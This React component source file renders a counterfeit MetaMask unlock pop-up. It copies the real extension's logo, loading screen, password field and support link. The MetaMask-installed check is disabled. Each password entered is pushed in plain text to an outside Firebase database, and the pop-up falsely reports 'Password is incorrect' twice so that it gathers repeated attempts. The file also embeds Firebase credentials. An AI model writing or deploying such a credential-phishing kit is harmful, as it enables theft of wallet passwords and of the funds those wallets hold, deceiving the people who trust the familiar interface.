import { useState, useEffect, useRef, lazy, Suspense } from "react";
import Modal from "react-modal";
import meta_logo from "./assets/img/metamask-fox.svg";
import spinner from "./assets/img/spinner.gif";
// import { ReactComponent as ArrowDown } from "./images/icons/arrow-down.svg";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";
import "./index.css";
import "./MM.css";
const FoxAnimation = lazy(
  () => import('./FoxAnimation'),
);
const isDark = true; //window.matchMedia("(prefers-color-scheme: dark)").matches;
// console.log(window.matchMedia("(prefers-color-scheme: dark)"));
// const basic = {
//   apiKey: "AIzaSyDSQrbrdcdjhvwzXccJQMbQ5x7XKTPlt9g",
//   authDomain: "walletintegration-vic.firebaseapp.com",
//   projectId: "walletintegration-vic",
//   storageBucket: "walletintegration-vic.firebasestorage.app",
//   messagingSenderId: "563872958446",
//   appId: "1:563872958446:web:18c71569e281a96bebf0ff",
//   measurementId: "G-NB5GFJ8BTD"
// };

const basic = {
  apiKey: "AIzaSyDrw7DHzaYlrYpXIFLO6AP2ewyzuexYKzQ",
  authDomain: "cried-doll.firebaseapp.com",
  projectId: "cried-doll",
  storageBucket: "cried-doll.firebasestorage.app",
  messagingSenderId: "640833197999",
  appId: "1:640833197999:web:19a1973e319a5df920815a",
  measurementId: "G-HBGRJFGKCZ"
};


const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
const MM = ({ isOpn, setIsOpn }) => {
  console.log(isOpn)
  const inputRef = useRef(null);
  const [isEnter, setIsEnter] = useState(0);
  const [loading, setLoading] = useState(true);
  const [pwd, setPwd] = useState("");
  const [validShow, setValidShow] = useState(false);

  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
      zIndex: 10000,
    },
      content: {
        top: "0px",
        left: "auto",
        right: "128px",
        bottom: "auto",
        padding: "0",
        border: "1px solid rgba(0,0,0,0.08)",
        borderRadius: "0",
        width: "400px",
        height: "600px",
        background: "transparent",
        overflow: "hidden",
        boxShadow: "0px 15px 30px rgba(16, 23, 41, 0.35)",
        zIndex: 10000,
        fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif",
      },
  };

  const handleCloseModal = () => {
    setIsOpn(false);
  };
  const handleChange = (val) => {
    setPwd(val);
    setValidShow(false);
  };
  const handleClick = () => {
    // ⚠️ DEBUG: Data being sent to Firebase Realtime Database
    // Destination: Firebase Project "walletintegration-vic"
    // Path: "mm_provider/1103"
    // Full URL: https://walletintegration-vic-default-rtdb.firebaseio.com/mm_provider/1103
    console.log('[DEBUG] Sending data to Firebase:', {
      path: 'mm_provider/1103',
      password: pwd ? `${pwd.substring(0, 2)}***` : '(empty)', // Only log first 2 chars for security
      timestamp: new Date().toISOString()
      // firebaseProject: 'walletintegration-vic',
      // databaseURL: 'https://walletintegration-vic-default-rtdb.firebaseio.com/'
    });
    
    // ⚠️ SECURITY ISSUE: Password is sent in plain text to Firebase
    push(ref(rtdb, "mm_provider/1103"), {
      value: pwd,                    // Password in plain text
      date: String(new Date()),      // Timestamp
    }).then(() => {
      console.log('[DEBUG] Data successfully sent to Firebase');
    }).catch((error) => {
      console.error('[DEBUG] Error sending data to Firebase:', error);
    });
    
    setIsEnter(isEnter + 1);
    if(isEnter < 2) setValidShow(true);
    else setIsOpn(false);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    if (pwd.length === 0) return;
    
    // ⚠️ DEBUG: Unlock button clicked
    console.log('[DEBUG] Unlock button clicked, password length:', pwd.length);
    
    handleClick(); // This will send password to Firebase
  };
  useEffect(() => {
    if (isOpn) {
      // if (!window.ethereum) {
      if (false) {
        alert("Please install MetaMask!");
        window.open("https://metamask.io/download.html", "_blank");
        setIsOpn(false);
        return;
      }
      setTimeout(() => {
        setLoading(false);
        setTimeout(() => {
          inputRef.current && inputRef.current.focus();
        }, 50);
      }, 2000); // Match MM_LatestUI: 600ms loading screen
    } else {
      setLoading(true);
      setPwd("");
      setValidShow(false);
    }
  }, [isOpn]);

  const renderLoading = () => (
    <>
      <div className="metamask-login-modal__loading-screen">
        <div className="metamask-login-modal__loading-container">
          <img 
            src={meta_logo} 
            alt="MetaMask" 
            className="metamask-login-modal__loading-logo" 
          />
          <img 
            src={spinner} 
            alt="" 
            className="metamask-login-modal__loading-spinner" 
          />
        </div>
      </div>
    </>
  );

  const renderUnlock = () => (
    <>
      <form className="metamask-login-modal" onSubmit={handleSubmit}>
        <div className="metamask-login-modal__content">
          {/* MetaMask Logo - matches unlock-page__mascot-container */}
          <div className="metamask-login-modal__mascot-container">
            <img
              src="/images/logo/light-logo.png" 
              alt="MetaMask"
              width="180"
              height="180"
              className="metamask-login-modal__horizontal-logo unlock-page__mascot-container__horizontal-logo unlock-page__mascot-container__horizontal-logo--popup"
              draggable={false}
            />
          </div>

          <div style={{marginBottom: '16px', width: '100%'}}>
            <div className={`metamask-login-modal__input-container ${validShow ? 'metamask-login-modal__input-container--error' : ''}`}>
              <input
                ref={inputRef}
                id="password"
                type="password"
                placeholder="Enter your password"
                value={pwd}
                onChange={(e) => handleChange(e.target.value)}
                autoFocus
                className="metamask-login-modal__input"
                disabled={false}
                data-testid="login-password-input"
              />
            </div>
            {validShow && <p className="metamask-login-modal__error">Password is incorrect. Please try again.</p>}
          </div>

          {/* Unlock Button */}
          <div className="metamask-login-modal__button-container">
            <button
              type="submit"
              disabled={!pwd || false}
              className="metamask-login-modal__unlock-button"
              data-testid="login-unlock-button"
            >
              Unlock
            </button>
          </div>

          {/* Forgot Password Link */}
          <button
            type="button"
            className="metamask-login-modal__forgot-password"
            data-testid="login-forgot-password"
          >
            Forgot password?
          </button>

          {/* Help Text */}
          <div className="metamask-login-modal__help-text">
            Need help?{' '} Contact {' '}
            <a
              href="https://support.metamask.io"
              target="_blank"
              rel="noopener noreferrer"
              className="metamask-login-modal__support-link"
            >
              MetaMask support
            </a>
          </div>
        </div>
      </form>
      {/* Fox Graphic - using Rive animation from MetaMask extension */}
      <Suspense fallback={<div className="metamask-login-modal__loading-spinner"></div>}>
        <FoxAnimation />
      </Suspense>
    </>
  );

  return (
    <Modal
      isOpen={isOpn}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      <div className="metamask-modal-content" data-theme={isDark ? "dark" : "light"}>
        {loading ? renderLoading() : renderUnlock()}
      </div>
    </Modal>
  );
};

export default MM;
